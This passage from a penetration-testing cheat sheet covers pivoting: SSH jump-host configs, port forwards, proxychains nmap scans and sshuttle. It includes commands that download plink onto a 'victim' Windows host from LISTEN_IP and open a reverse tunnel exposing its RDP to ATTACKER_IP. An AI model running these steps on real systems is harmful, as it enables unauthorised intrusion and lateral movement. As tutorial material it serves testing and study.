class=\"pl-smi\"\u003e$pubkey\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e\u0026gt;\u0026gt;\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e~\u003c/span\u003e/.ssh/authorized_keys\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e where $from_addr is the IP that will be connecting to kali, and $pubkey is\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e the full text of the id_rsa.pub file that you are using for this purpose.\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eWhen repeatedly using the same ProxyJump, it is easier to use if you set up \u003ccode\u003essh_config\u003c/code\u003e appropriately. See \u003ca href=\"https://medium.com/maverislabs/proxyjump-the-ssh-option-you-probably-never-heard-of-2d7e41d43464\" rel=\"nofollow\"\u003ehere\u003c/a\u003e for more details. Summary of how to do it:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"Host jumpbox1\n    HostName 10.1.1.100\n    Port 22\n    User jumper1\n    IdentityFile /home/user/.ssh/id_rsa_jump1\nHost jumpbox2\n    HostName 10.2.2.100\n    Port 22\n    User jumper2\n    IdentityFile /home/user/.ssh/id_rsa_jump2\n    ProxyJump jumpbox1\nHost jumpbox3\n    HostName 10.3.3.100\n    Port 22\n    User jumper3\n    IdentityFile /home/user/.ssh/id_rsa_jump3\n    ProxyJump jumpbox2\nHost target\n    HostName 10.4.4.100\n    Port 22\n    User target\n    IdentityFile /home/user/.ssh/id_rsa_target\n    ProxyJump jumpbox3\n    RemoteForward 8080 127.0.0.1:8080  # open remote port 8080 and redirect all the way back to attacker machine\n    LocalForward 3306 127.0.0.1:3306  # open attacker-local port 3306 that forwards to target's internal port 3306\n    DynamicForward 1080  # open SOCKS proxy on attacker that tunnels all the way through target as exit node\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eHost jumpbox1\n    HostName 10.1.1.100\n    Port 22\n    User jumper1\n    IdentityFile /home/user/.ssh/id_rsa_jump1\nHost jumpbox2\n    HostName 10.2.2.100\n    Port 22\n    User jumper2\n    IdentityFile /home/user/.ssh/id_rsa_jump2\n    ProxyJump jumpbox1\nHost jumpbox3\n    HostName 10.3.3.100\n    Port 22\n    User jumper3\n    IdentityFile /home/user/.ssh/id_rsa_jump3\n    ProxyJump jumpbox2\nHost target\n    HostName 10.4.4.100\n    Port 22\n    User target\n    IdentityFile /home/user/.ssh/id_rsa_target\n    ProxyJump jumpbox3\n    RemoteForward 8080 127.0.0.1:8080  # open remote port 8080 and redirect all the way back to attacker machine\n    LocalForward 3306 127.0.0.1:3306  # open attacker-local port 3306 that forwards to target's internal port 3306\n    DynamicForward 1080  # open SOCKS proxy on attacker that tunnels all the way through target as exit node\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eYou can also set up OpenSSH (v4.3+) to act as a full VPN to tunnel traffic. See\n\u003ca href=\"https://wiki.archlinux.org/index.php/VPN_over_SSH#OpenSSH's_built_in_tunneling\" rel=\"nofollow\"\u003ehere\u003c/a\u003e for how to do it. (\u003ccode\u003e-w\u003c/code\u003e command flag, or \u003ccode\u003eTunnel\u003c/code\u003e ssh_config option).\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003ePRO TIP\u003c/strong\u003e: If setting up a remote ssh tunnel purely to (remote-)forward traffic, use the following flags: \u003ccode\u003e-gfNTR\u003c/code\u003e.\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ccode\u003e-f\u003c/code\u003e forks the ssh process into the background after\nconnection is established so you can keep using your terminal.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e-N\u003c/code\u003e and \u003ccode\u003e-T\u003c/code\u003e say \"No\" commands can be executed and no \"TTY\" is allocated.\nUsing these together prevents command execution on the remote host (jump box)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e-g\u003c/code\u003e and \u003ccode\u003e-R\u003c/code\u003e enable \"Gateway\" ports and do \"Remote\" port forwarding\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e8.1.1 Ad Hoc SSH Port Forwards\u003c/h3\u003e\u003ca id=\"user-content-811-ad-hoc-ssh-port-forwards\" class=\"anchor\" aria-label=\"Permalink: 8.1.1 Ad Hoc SSH Port Forwards\" href=\"#811-ad-hoc-ssh-port-forwards\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eTL;DR:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"\u0026lt;ENTER\u0026gt;\u0026lt;ENTER\u0026gt;~C\nhelp\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e\u0026lt;ENTER\u0026gt;\u0026lt;ENTER\u0026gt;~C\nhelp\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ccode\u003essh\u003c/code\u003e also has an open command line mode to add or delete \u003cstrong\u003ead hoc port forwards\u003c/strong\u003e. This can be summoned by typing the \u003ccode\u003e\u0026lt;shift\u0026gt; ~ c\u003c/code\u003e key sequence (\u003ccode\u003e~C\u003c/code\u003e) after SSH-ing into a box. One nuance to note is that the \u003ccode\u003e~C\u003c/code\u003e is only recognized after a new line, so be sure to hit Enter a few times before typing in the key sequence. It likes to be called from a pure blinking command prompt that hasnt been \"dirtied\" by, for example, typing something, then deleting it. So just be sure to hit Enter a few times before trying to drop into the SSH open command line mode.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eThe ssh prompt will change to \u003ccode\u003essh\u0026gt;\u003c/code\u003e when you enter ad hoc command line mode.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eTyping \u003ccode\u003ehelp\u003c/code\u003e in ad hoc command line mode shows command syntax examples.\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e8.1.2 SSH on Windows\u003c/h3\u003e\u003ca id=\"user-content-812-ssh-on-windows\" class=\"anchor\" aria-label=\"Permalink: 8.1.2 SSH on Windows\" href=\"#812-ssh-on-windows\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eSSH comes with Windows 10 by default since 1803 (and optionally since 1709). It's found in the \u003ccode\u003e%systemdrive%\\Windows\\System32\\OpenSSH\u003c/code\u003e folder. Use \u003ccode\u003essh.exe\u003c/code\u003e just like \u003ccode\u003essh\u003c/code\u003e on Linux.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# check if SSH is on Windows\nwhere.exe ssh\n\n# check if version \u0026gt;= 7.6, so we can use Reverse Dynamic forwarding\nssh.exe -V\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check if SSH is on Windows\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003ewhere.exe\u003c/span\u003e ssh\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check if version \u0026gt;= 7.6, so we can use Reverse Dynamic forwarding\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003essh.exe\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eV\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThe other option is to copy \u003cstrong\u003e\u003ccode\u003eplink.exe\u003c/code\u003e\u003c/strong\u003e over to the Windows box.\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e \u003cstrong\u003eNOTE:\u003c/strong\u003e If you need a SOCKS proxy instead of just direct port forwarding, DON'T use plink! It doesn't support SOCKS. Use chisel instead!!!\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# grab copy of plink and host on http for Windows victim\ncp /usr/share/windows-resources/binaries/plink.exe .\npython -m http.server 80\n\n# on windows, download it\niwr http://LISTEN_IP/plink.exe -outfile C:\\Windows\\Temp\\plink.exe\n\n# use plink similar to ssh, with addition of '-l USER -pw PASSWD'\n# Note: echo y accepts host key on non-interactive shells.\n# This command opens up the victim's firewalled RDP to your kali box.\ncmd.exe /c echo y | C:\\Windows\\Temp\\plink.exe -ssh -l portfwd -pw herpderp -N -R 3389:127.0.0.1:3389 ATTACKER_IP\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e grab copy of plink and host on http for Windows victim\u003c/span\u003e\ncp /usr/share/windows-resources/binaries/plink.exe \u003cspan class=\"pl-c1\"\u003e.\u003c/span\u003e\npython -m http.server 80\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e on windows, download it\u003c/span\u003e\niwr http://LISTEN_IP/plink.exe -outfile C:\u003cspan class=\"pl-cce\"\u003e\\W\u003c/span\u003eindows\u003cspan class=\"pl-cce\"\u003e\\T\u003c/span\u003eemp\u003cspan class=\"pl-cce\"\u003e\\p\u003c/span\u003elink.exe\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e use plink similar to ssh, with addition of '-l USER -pw PASSWD'\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Note: echo y accepts host key on non-interactive shells.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e This command opens up the victim's firewalled RDP to your kali box.\u003c/span\u003e\ncmd.exe /c \u003cspan class=\"pl-c1\"\u003eecho\u003c/span\u003e y \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e C:\u003cspan class=\"pl-cce\"\u003e\\W\u003c/span\u003eindows\u003cspan class=\"pl-cce\"\u003e\\T\u003c/span\u003eemp\u003cspan class=\"pl-cce\"\u003e\\p\u003c/span\u003elink.exe -ssh -l portfwd -pw herpderp -N -R 3389:127.0.0.1:3389 ATTACKER_IP\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e8.1.3 Creating restricted user for ssh port forwarding only\u003c/h3\u003e\u003ca id=\"user-content-813-creating-restricted-user-for-ssh-port-forwarding-only\" class=\"anchor\" aria-label=\"Permalink: 8.1.3 Creating restricted user for ssh port forwarding only\" href=\"#813-creating-restricted-user-for-ssh-port-forwarding-only\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThis is valuable for working with \u003ccode\u003eplink.exe\u003c/code\u003e on Windows, which requires entering your password in plaintext into the command line, which isn't ideal for security.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eFirst create the restricted \u003ccode\u003eportfwd\u003c/code\u003e user on your Kali box:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# create restricted user\n# change 'herpderp' to whatever password you desire\n# keep space in front of command to avoid it getting saved in shell history\n sudo useradd -c \u0026quot;ssh port forwarding only\u0026quot; --no-create-home --home-dir \u0026quot;/nonexistent\u0026quot; --no-user-group --system --shell \u0026quot;/usr/sbin/nologin\u0026quot; --password \u0026quot;$(openssl passwd -6 herpderp)\u0026quot; portfwd\n\n# removing the user:\nsudo userdel portfwd\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e create restricted user\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e change 'herpderp' to whatever password you desire\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e keep space in front of command to avoid it getting saved in shell history\u003c/span\u003e\n sudo useradd -c \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003essh port forwarding only\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e --no-create-home --home-dir \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e/nonexistent\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e --no-user-group --system --shell \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e/usr/sbin/nologin\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e --password \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e$(\u003c/span\u003eopenssl passwd -6 herpderp\u003cspan class=\"pl-pds\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e portfwd\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e removing the user:\u003c/span\u003e\nsudo userdel portfwd\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThen add the following to the bottom of your \u003ccode\u003e/etc/ssh/sshd_config\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"Match User portfwd\n   #AllowTcpForwarding yes\n   #X11Forwarding no\n   #PermitTunnel no\n   #GatewayPorts no\n   #PermitOpen localhost:6969\n   AllowAgentForwarding no\n   PermitTTY no\n   ForceCommand /usr/sbin/false\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eMatch User portfwd\n   #AllowTcpForwarding yes\n   #X11Forwarding no\n   #PermitTunnel no\n   #GatewayPorts no\n   #PermitOpen localhost:6969\n   AllowAgentForwarding no\n   PermitTTY no\n   ForceCommand /usr/sbin/false\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eFinally, you MUST include the \u003ccode\u003e-N\u003c/code\u003e flag (no commands) when connecting over ssh, so you don't get booted when \u003ccode\u003e/usr/sbin/false\u003c/code\u003e returns an error.\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e8.2 SOCKS Proxies and proxychains\u003c/h2\u003e\u003ca id=\"user-content-82-socks-proxies-and-proxychains\" class=\"anchor\" aria-label=\"Permalink: 8.2 SOCKS Proxies and proxychains\" href=\"#82-socks-proxies-and-proxychains\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ccode\u003eproxychains\u003c/code\u003e is great for tunneling TCP traffic through a SOCKS proxy (like\nwhat \u003ccode\u003essh -D\u003c/code\u003e and \u003ccode\u003echisel -D\u003c/code\u003e give you).\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eAdd a proxy configuration line at the bottom of \u003ccode\u003e/etc/proxychains4.conf\u003c/code\u003e. The config format is \u003ccode\u003esocks5 PROXY_IP PORT\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# make sure proxychains is confgured for SOCKS:\nsudo sh -c 'echo \u0026quot;socks5 127.0.0.1 1080\u0026quot; \u0026gt;\u0026gt; /etc/proxychains4.conf'\n# prefer socks5 because it supports UDP (DNS!)\n# if your proxy doesn't support it, use socks4\n\n# using proxychains: put your command after 'proxychains -q'\n# '-q' is quiet, so you don't see stderr msgs for each connection\nsudo proxychains -q nmap -v -sT -F --open -Pn $VICTIM_IP\nsudo proxychains -q nmap -v -sU -F --open -Pn $VICTIM_IP\n\n\n# to proxy DNS through the new SSH SOCKS tunnel, set the following line in\n# /etc/proxychains4.conf:\nproxy_dns\n# and set the following env variable:\nexport PROXYRESOLVE_DNS=REMOTE_DNS_SVR\n\n# to speed up scanning with nmap through proxychains, set the following in\n# /etc/proxychains.conf:\ntcp_read_time_out 1000\ntcp_connect_time_out 500\n\n\n# ssh doesn't seem to work through proxychains.\n# to tunnel ssh through a SOCKS proxy:\nssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' victim@VICTIM_IP\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e make sure proxychains is confgured for SOCKS:\u003c/span\u003e\nsudo sh -c \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eecho \"socks5 127.0.0.1 1080\" \u0026gt;\u0026gt; /etc/proxychains4.conf\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e prefer socks5 because it supports UDP (DNS!)\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if your proxy doesn't support it, use socks4\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e using proxychains: put your command after 'proxychains -q'\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e '-q' is quiet, so you don't see stderr msgs for each connection\u003c/span\u003e\nsudo proxychains -q nmap -v -sT -F --open -Pn \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\nsudo proxychains -q nmap -v -sU -F --open -Pn \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e to proxy DNS through the new SSH SOCKS tunnel, set the following line in\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e /etc/proxychains4.conf:\u003c/span\u003e\nproxy_dns\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e and set the following env variable:\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eexport\u003c/span\u003e PROXYRESOLVE_DNS=REMOTE_DNS_SVR\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e to speed up scanning with nmap through proxychains, set the following in\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e /etc/proxychains.conf:\u003c/span\u003e\ntcp_read_time_out 1000\ntcp_connect_time_out 500\n\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e ssh doesn't seem to work through proxychains.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e to tunnel ssh through a SOCKS proxy:\u003c/span\u003e\nssh -o ProxyCommand=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003encat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e victim@VICTIM_IP\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e \u003cstrong\u003eNOTE\u003c/strong\u003e: To scan TCP with nmap through a SOCKS proxy, only full-connection scans are possible! (nmap option flag \u003ccode\u003e-sT\u003c/code\u003e). It's also often necessary to tell nmap to assume the host is up (\u003ccode\u003e-Pn\u003c/code\u003e). Until nmap's \u003ccode\u003e--proxy\u003c/code\u003e flag is stable, use \u003ccode\u003eproxychains nmap\u003c/code\u003e instead.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eBy default, Proxychains is configured with very high time-out values. This can make port scanning really slow. Lowering the \u003ccode\u003etcp_read_time_out\u003c/code\u003e and \u003ccode\u003etcp_connect_time_out\u003c/code\u003e values in \u003ccode\u003e/etc/proxychains4.conf\u003c/code\u003e will force time-out on non-responsive connections more quickly. This can dramatically speed up port-scanning times. I used \u003ccode\u003etcp_read_time_out 1000\u003c/code\u003e and \u003ccode\u003etcp_connect_time_out 500\u003c/code\u003e successfully.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e8.3 Bending with sshuttle\u003c/h2\u003e\u003ca id=\"user-content-83-bending-with-sshuttle\" class=\"anchor\" aria-label=\"Permalink: 8.3 Bending with sshuttle\" href=\"#83-bending-with-sshuttle\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://sshuttle.readthedocs.io/en/stable/usage.html\" rel=\"nofollow\"\u003eSshuttle\u003c/a\u003e is a python library that handles setting up a combination of IPTABLES rules and SSH proxy tunnels to transparently route all traffic to a target internal subnet easily.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# sshuttle is most useful when you combine it with a multihop\n# configuration like so:\n# kali -\u0026gt; jumpbox1 (socat listening on 2222) -\u0026gt; DMZ_net (10.1.1.0/24) -\u0026gt; jumpbox2 (ssh) -\u0026gt; internal_net (172.16.2.0/24)\n\n# on kali, run:\n# the CIDR IPs are the target subnets you want sshuttle to route\n# through your tunnel transparently.\nsshuttle --dns -r jumpbox2_user@jumpbox1_ip:2222 10.1.1.0/24 172.16.2.0/24\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e sshuttle is most useful when you combine it with a multihop\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e configuration like so:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e kali -\u0026gt; jumpbox1 (socat listening on 2222) -\u0026gt; DMZ_net (10.1.1.0/24) -\u0026gt; jumpbox2 (ssh) -\u0026gt; internal_net (172.16.2.0/24)\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e on kali, run:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e the CIDR IPs are the target subnets you want sshuttle to route\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e through your tunnel transparently.\u003c/span\u003e\nsshuttle --dns -r jumpbox2_user@jumpbox1_ip:2222 10.1.1.0/24 172.16.2.0/24\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e8.4 Bending with socat\u003c/h2\u003e\u003ca id=\"user-content-84-bending-with-socat\" class=\"anchor\" aria-label=\"Permalink: 8.4 Bending with socat\" href=\"#84-bending-with-socat\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 